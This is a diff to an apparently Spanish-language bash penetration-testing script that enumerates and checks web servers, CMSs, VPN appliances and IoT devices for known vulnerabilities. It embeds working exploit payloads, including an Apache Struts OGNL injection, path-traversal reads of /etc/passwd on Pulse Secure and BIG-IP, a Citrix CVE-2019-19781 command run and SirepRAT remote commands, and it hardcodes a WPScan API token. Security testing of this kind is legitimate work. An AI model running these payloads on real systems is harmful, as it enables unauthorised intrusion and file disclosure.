@@ -18,17 +18,18 @@ RESET='\e[0m'
 
 
 ################## Config HERE ####################
-#netA="10.0.X.0/24";
-netA="10.10.X.0/24";
-netB="172.16.X.0/24";
-netC="192.168.X.0/24";
-#netC="192.168.X.0/24";
 port_scan_num=1;
 min_ram=400;
 hilos_web=30;
+DOMINIO_EXTERNO=''
+DOMINIO_INTERNO=''
 max_perl_instancias=50;
 port_scanner='nmap_masscan' #nmap/naabu/masscan/nmap_masscan/nmap_naabu
 common_user_list="/usr/share/wordlists/usuarios-en.txt"
+oracle_passwords="/usr/share/wordlists/oracle_default_userpass.txt"
+common_domains="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
+#"/usr/share/seclists/Usernames/Names/names.txt"
+#
 #/usr/share/seclists/Usernames/cirt-default-usernames.txt
 #############################
 
@@ -66,58 +67,560 @@ function insert_data () {
 	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
 	mv .banners/* .banners2 2>/dev/null
 	}
+
+
+function enumeracionIIS () {
+   proto=$1
+   host=$2
+   port=$3     
+   echo -e "\t\t[+] Enumerar IIS ($proto : $host : $port)"	
+
+    if [[ ${host} != *"nube"* && ${host} != *"webmail"*  && ${host} != *"autodiscover"* ]];then 
+		echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"		
+		web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &		
+		sleep 1					
+	fi	
+
+    egrep -iq "IIS/6.0|IIS/5.1" .enumeracion/"$host"_"$port"_webData.txt
+    IIS6=$?
+    if [[ $IIS6 -eq 0 ]];then
+        echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
+        echo "nmap -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 
+        nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 					
+        grep "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 					
+    
+    fi
+
+    echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
+    echo "nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
+    nmap -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
+    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
+
+    echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"						
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_iis_admin.txt
+    egrep --color=never "^200|^401" logs/enumeracion/"$host"_iis_admin.txt >> .enumeracion/"$host"_iis_admin.txt  
+    sleep 1
+
+    echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 > logs/enumeracion/"$host"_iis_webarchivos.txt
+    egrep --color=never "^200" logs/enumeracion/"$host"_iis_webarchivos.txt  >> .enumeracion/"$host"_iis_webarchivos.txt  
+    sleep 1
+
+    echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - IIS)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -q 1 > logs/enumeracion/"$host"_iis_webarchivos.txt  
+    egrep --color=never "^200" logs/enumeracion/"$host"_iis_webarchivos.txt >> .enumeracion/"$host"_iis_webarchivos.txt  
+    sleep 1
+
+    echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m webservices -s $proto -q 1 > logs/enumeracion/"$host"_iis_webarchivos.txt  
+    egrep --color=never "^200" logs/enumeracion/"$host"_iis_webarchivos.txt  >> .enumeracion/"$host"_iis_webarchivos.txt  
+    sleep 1
+
+    echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"								
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m backdoorIIS -s $proto -q 1 > logs/vulnerabilidades/"$host"_iis_webshell.txt
+    egrep --color=never "^200" logs/vulnerabilidades/"$host"_iis_webshell.txt >> .vulnerabilidades/"$host"_iis_webshell.txt
+    sleep 1
+
+    echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m backupIIS -s $proto -q 1 > logs/vulnerabilidades/"$host"_iis_backupWeb.txt
+    egrep --color=never "^200" logs/vulnerabilidades/"$host"_iis_backupWeb.txt  >> .vulnerabilidades/"$host"_iis_webarchivos.txt 
+    sleep 1	
+
+	msfconsole -x "use auxiliary(scanner/http/iis_shortname_scanner;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_iis_shortname.txt 2>/dev/null							   
+	grep '\[+\]' logs/enumeracion/"$ip"_iis_shortname.txt  >> .enumeracion/"$ip"_iis_shortname.txt
+
+}
+
+
+
+function enumeracionApache () {  
+   proto=$1
+   host=$2
+   port=$3  
+   echo -e "\t\t[+] Enumerar Apache ($proto : $host : $port)"	
+
+webData.pl -t $ip -d /nonexists134 -p $port -e todo -l /dev/null -r 1 2>/dev/null | cut -d "~" -f1
+
+   	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then 
+        echo -e "\t\t[+] Revisando directorios comunes ($host - Apache/nginx)"
+        web-buster.pl -t $host  -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
+        sleep 1					
+	fi
+
+    #  CVE-2021-4177								
+    echo -e "\t\t[+] Revisando apache traversal)" 
+    apache-traversal.py  --target  $host --port $port > logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  	
+    grep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$host"_"$port"_apacheTraversal.txt
+
+    echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
+    web-buster.pl -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_admin.txt
+    egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_admin.txt > .enumeracion/"$host"_"$port"_admin.txt 
+    sleep 1
+    
+    echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
+    web-buster.pl -t $host  -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 | egrep --color=never "^200" >> .enumeracion/"$host"_"$port"_webarchivos.txt  &
+    sleep 1
+
+    echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m backupApache -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
+    egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_webarchivos.txt   >> .enumeracion/"$host"_"$port"_webarchivos.txt  
+    sleep 1
+    
+
+    echo -e "\t\t[+] Revisando backups de archivos genericos ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt  
+    egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_webarchivos.txt   >> .enumeracion/"$host"_"$port"_webarchivos.txt  
+    sleep 1
+        																						
+
+    
+    echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m files2 -s $proto -q 1 > logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  
+    egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  
+    sleep 1
+    
+    echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 | egrep --color=never "^200" | awk '{print $2}' > .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  &
+    #web-buster.pl -t $host -p $port -h $hilos_web -d / -m default -s http -q 1 > logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  
+#								egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt  
+    sleep 1
+    
+    echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m backdoorApache -s $proto -q 1 > logs/vulnerabilidades/"$host"_"$port"_webshell.txt 
+    egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_webshell.txt  | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_webshell.txt 								
+    sleep 1
+    
+    echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m registroHabilitado -s $proto -q 1 > logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt 
+    egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt  | awk '{print $2}' >> .vulnerabilidades/"$host"_"$port"_registroHabilitado.txt
+    sleep 1
+    
+    echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & # solo a la carpeta logs
+
+	if [ $internet == "s" ]; then 									                                
+		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
+		echo "nmap --script http-slowloris-check -p $port $host" > logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
+		nmap -Pn --script http-slowloris-check -p $port $host >> logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
+		grep "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
+	fi
+
+	egrep -i "is behind" .enumeracion/"$host"_"$port"_wafw00f.txt
+    greprc=$?
+    if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
+        echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
+		web-buster.pl -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt        		
+		egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_archivosCGI.txt | awk '{print $2}' >> servicios/cgi.txt; 
+        cat servicios/cgi.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt
+        sleep 1								
+    fi	
+}
+
+
+
+function enumeracionTomcat () {  
+   proto=$1
+   host=$2
+   port=$3  
+   echo -e "\t\t[+] Enumerar Tamcat ($proto : $host : $port)"	
+
+    echo -e "\t\t[+] Revisando Apache Struts"
+    curl --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "$proto://$host:$port/" > logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null
+    grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port"_apacheStruts.txt
+        
+    if [[ ${host} != *"nube"* && ${host} != *"webmail"*  && ${host} != *"autodiscover"* ]];then 
+        echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"								
+        web-buster.pl -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &			
+        sleep 1;
+    fi									
+    
+    echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m tomcat -s $proto -q 1  > logs/enumeracion/"$host"_"$port"_webarchivos.txt 
+    egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  
+    
+    sleep 1;
+    echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"
+    web-buster.pl -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 > logs/enumeracion/"$host"_"$port"_webarchivos.txt 
+    egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_webarchivos.txt   >> .enumeracion/"$host"_"$port"_webarchivos.txt  
+    sleep 1	    
+}
+
+
+
+function enumeracionCMS () { 
+   proto=$1
+   host=$2
+   port=$3  
+   echo -e "\t\t[+] Enumerar CMSs ($proto : $host : $port)"	
+
+    echo -e "\t\t[+] Revisando vulnerabilidades HTTP mixtas"
+    nmap -Pn -p $port --script=http-vuln* $host >> logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
+    grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt | grep -v ERROR > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
+    sleep 1
+
+    #######  drupal (domain) ######
+    grep -qi drupal .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 										
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de drupal ($host)"
+        droopescan scan drupal -u  "$proto"://$host --output json > logs/vulnerabilidades/"$host"_"$port"_droopescan.txt								
+        cat logs/vulnerabilidades/"$host"_"$port"_droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt																																								
+    fi
+
+    #######  wordpress (domain) ######
+    grep -qi wordpress .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 		
+        wpscan  --update
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($host)"
+        wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto"//$host --format json > logs/vulnerabilidades/"$host"_"$port"_wpUsers2.txt
+        wpscan --disable-tls-checks  --random-user-agent --url "$proto"//$host/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
+        
+
+        #msfconsole -x "use auxiliary/scanner/http/wordpress_content_injection;set RHOSTS $host;run;exit" > logs/vulnerabilidades/"$host"_3389_BlueKeep.txt
+        
+        grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$host"_"$port"_wpUsers2.txt
+        greprc=$?
+        if [[ $greprc -eq 0 ]];then 		
+            echo -e "\t\t\t[+] Redireccion en wordpress"
+            url=`cat logs/vulnerabilidades/"$host"_"$port"_wpUsers2.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
+            
+            wpscan --disable-tls-checks --enumerate u  --random-user-agent --url $url > logs/vulnerabilidades/"$host"_"$port"_wpUsers2.txt									
+            wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
+            
+        fi
+
+        grep "Title" logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
+        strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "Title" -m1 -b3 -A19 >> logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
+        if [[ ! -s .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt  ]] ; then
+            strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "out of date" -m1 -b3 -A19 >> logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
+            cp logs/vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt .vulnerabilidades/"$host"_"$port"_pluginDesactualizado.txt
+        fi
+        
+
+        strings logs/vulnerabilidades/"$host"_"$port"_wpscan.txt | grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$host"_"$port"_configuracionInseguraWordpress.txt
+        cat logs/vulnerabilidades/"$host"_"$port"_wpUsers2.txt | wpscan-parser.py > .vulnerabilidades/"$host"_"$port"_wpUsers.txt
+        grep -i users logs/vulnerabilidades/"$host"_"$port"_wpUsers2.txt -m1 -b1 -A20 > logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt
+    fi
+                                
+    ###################################	 
+
+    #######  citrix (domain) ######
+    grep -qi citrix .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 								
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($host)"
+        
+        CVE-2019-19781.sh $host $port "cat /etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt
+        egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt > .vulnerabilidades/"$host"_"$port"_citrixVul.txt
+        
+    fi
+    ###################################	
+
+    #######  Pulse secure (domain) ######
+    grep -qi pulse .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 								
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($host)"
+        
+        curl --path-as-is -s -k "$proto://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt
+        egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt > .vulnerabilidades/"$host"_"$port"_pulseVul.txt
+        
+    fi
+    ##################################		
+
+
+    #######  OWA (domain) ######
+    egrep -qi "Outlook|owa" .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 		
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($host)"
+        
+        owa.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port"_owaVul.txt
+        egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_owaVul.txt > .vulnerabilidades/"$host"_"$port"_owaVul.txt
+        
+    fi
+    ###################################		
+
+
+    #######  grafana (domain) ######
+    egrep -qi "Grafana" .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 		
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de Grafana($host)"
+        
+        grafana.py -H $host -p $port  > logs/vulnerabilidades/"$host"_"$port"_grafana.txt 2>/dev/null
+        egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_grafana.txt > .vulnerabilidades/"$host"_"$port"_grafana.txt
+        
+    fi
+    ###################################	
+
+
+
+    #######  joomla (domain) ######
+    grep -qi joomla .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 										
+        echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($host)"
+        joomscan.sh -u "$proto"://$host/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port"_joomscan.txt &
+        
+        JoomlaJCKeditor.py --url "$proto://$host" > .vulnerabilidades/"$host"_"$port"_JoomlaJCKeditor.txt
+    fi
+    ###################################	
+
+    #######  WAMPSERVER (domain) ######
+    grep -qi WAMPSERVER .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 										
+        echo -e "\t[+] Enumerando WAMPSERVER ($host)"
+        wampServer.pl -url "$proto"://$host/ > .enumeracion/"$host"_"$port"_WAMPSERVER.txt &
+    fi
+    ###################################	
+
+
+    #######  BIG-IP F5 (domain) ######
+    grep -qi "BIG-IP" .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 		
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($host)"
+        
+        curl --path-as-is -s -k "$proto://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt
+        egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt > .vulnerabilidades/"$host"_"$port"_bigIPVul.txt
+        
+    fi
+    ###################################
+
+    #######  Cisco (ip) ######
+    grep -qi ciscoASA .enumeracion/"$host"_"$port"_webData.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]];then 		
+        echo -e "\t\t\t[+] Revisando vulnerabilidades de Cisco ASA/ Firepower ($host)"
+        
+        firepower.pl -host $host -port $port  > logs/vulnerabilidades/"$host"_"$port"_firepower.txt
+        egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port"_firepower.txt > .vulnerabilidades/"$host"_"$port"_firepower.txt
+        
+    fi
+}
+
+
+function testSSL ()
+{
+   proto=$1
+   host=$2
+   port=$3 
+
+    echo -e "\t\t[+] TEST SSL ($proto : $host : $port)"	
+    #######  hearbleed (dominio) ######						
+    echo -e "\t\t\t[+] Revisando vulnerabilidad heartbleed"
+    echo "nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host" > logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
+    nmap -n -sT -Pn -p $port --script=ssl-heartbleed $host >> logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
+    egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt
+    greprc=$?
+    if [[ $greprc -eq 0 ]] ; then						
+        echo -e "\t\ŧ$OKRED[!] Vulnerable a heartbleed \n $RESET"
+        grep "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
+        heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt
+        heartbleed.sh $host $port &
+    else							
+        echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
+    fi
+    ##########################
+    
+    
+    #######  Configuracion TLS/SSL (dominio) ######						
+    echo -e "\t\t\t[+] Revisando configuracion TLS/SSL"
+    
+    #testssl.sh --color 0  "https://$host:$port" > logs/vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null 
+    #grep --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt | egrep -iv "Vulnerable a" > .vulnerabilidades/"$host"_"$port"_confTLS.txt
+    #grep --color=never "VULNERABLE (actualizar)" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt > .vulnerabilidades/"$host"_"$port"_vulTLS.txt
+    #grep --color=never "VULNERABLE (actualizar)" -m1 -b0 -A9 logs/vulnerabilidades/"$host"_"$port"_confTLS.txt > logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt							 
+    
+    ##########################
+    
+
+}
+
+function enumeracionIOT ()
+{
+   proto=$1
+   host=$2
+   port=$3  
+   echo "Params $proto : $host : $port "
+        egrep -iq "Windows Device Portal" .enumeracion/"$host"_"$port"_webData.txt 
+        greprc=$?
+        if [[ $greprc -eq 0 && ! -f .enumeracion/"$host"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
+            echo -e "\t\t[+] Revisando SirepRAT ($host)"
+            SirepRAT.sh $host LaunchCommandWithOutput --return_output --cmd 'c:\windows\System32\cmd.exe' --args '/c ipconfig' --v >> logs/vulnerabilidades/"$host"_"$port"_SirepRAT.txt
+            grep -ia 'IPv4' logs/vulnerabilidades/"$host"_"$port"_SirepRAT.txt > .vulnerabilidades/"$host"_"$port"_SirepRAT.txt
+
+        fi
+
+                        
+        #######  DLINK backdoor ######
+        
+        respuesta=`grep -i alphanetworks .enumeracion/"$host"_"$port"_webData.txt`
+        greprc=$?
+        if [[ $greprc -eq 0 ]];then 		
+            echo -e "\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"						
+            echo -n "[DLINK] $respuesta" >> .vulnerabilidades/"$host"_"$port"_backdoorFabrica.txt 
+            
+        fi
+        ###########################	
+}        
+
+
+function cloneSite ()
+{
+   proto=$1
+   host=$2
+   port=$3  
+   echo -e "\t\t[+] Clone site ($proto : $host : $port)"	
+
+    #######  clone site (domain) ####### 									
+    cd webClone
+        echo -e "\t\t[+] Clonando sitio ($host) tardara un rato"	
+        wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto://$host 2>/dev/null
+        rm index.html.orig 2>/dev/null
+
+        echo ""
+        echo -e "\t\t[+] Extrayendo URL de los sitios clonados"	
+        grep --color=never -irao "http://[^ ]*"  * 2>/dev/null| cut -d ":" -f3 | grep --color=never -ia "$DOMINIO_EXTERNO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt 				     
+        lines=`wc -l http.txt  | cut -d " " -f1`
+        perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
+        paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/"$DOMINIO_EXTERNO"_web_wget2.txt # adicionar http:// a cada linea
+        rm http.txt 2>/dev/null
+
+        grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMINIO_EXTERNO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt 
+        lines=`wc -l https.txt  | cut -d " " -f1`
+        perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
+        paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/"$DOMINIO_EXTERNO"_web_wget2.txt  # adicionar https:// a cada linea
+        rm https.txt 2>/dev/null
+
+                    
+        echo -e "[+] Buscando archivos sin extension"
+        find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.PNG  -o -iname \*.txt  -o -iname \*.css  -o -iname \*.php -o -iname \*.orig \) > archivos-sin-extension.txt
+        contador=1
+        mkdir documentos_renombrados 2>/dev/null
+        for archivo in `cat archivos-sin-extension.txt`;
+        do 		
+            tipo_archivo=`file $archivo`
+            # tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
+            if [[ ${tipo_archivo} == *"PDF"*  ]];then 													
+                mv $archivo documentos_renombrados/$contador.pdf 
+            fi		
+        
+            if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
+                mv $archivo documentos_renombrados/$contador.doc 
+            fi		
+            
+            if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
+                mv $archivo documentos_renombrados/$contador.docx 
+            fi		
+        
+            if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
+                mv $archivo documentos_renombrados/$contador.xls 
+            fi				 
+        
+            if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
+                mv $archivo documentos_renombrados/$contador.xlsx 
+            fi
+                
+            if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
+                mv $archivo documentos_renombrados/$contador.ppt 
+            fi	
+                
+            if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
+                mv $archivo documentos_renombrados/$contador.pptx 
+            fi		
+        
+            if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
+                mv $archivo documentos_renombrados/$contador.rar 
+            fi		
+            let "contador=contador+1"	 
+        done # fin revisar archivos sin extension
+        
+        #### mover archivos con metadata para extraerlos ########
+        echo -e "[+] Extraer metadatos con exiftool"										
+        find . -name "*.pdf" -exec mv {} "../archivos" \;
+        find . -name "*.xls" -exec mv {} "../archivos" \;
+        find . -name "*.doc" -exec mv {} "../archivos" \;
+        find . -name "*.ppt" -exec mv {} "../archivos" \;
+        find . -name "*.pps" -exec mv {} "../archivos" \;
+        find . -name "*.docx" -exec mv {} "../archivos" \;
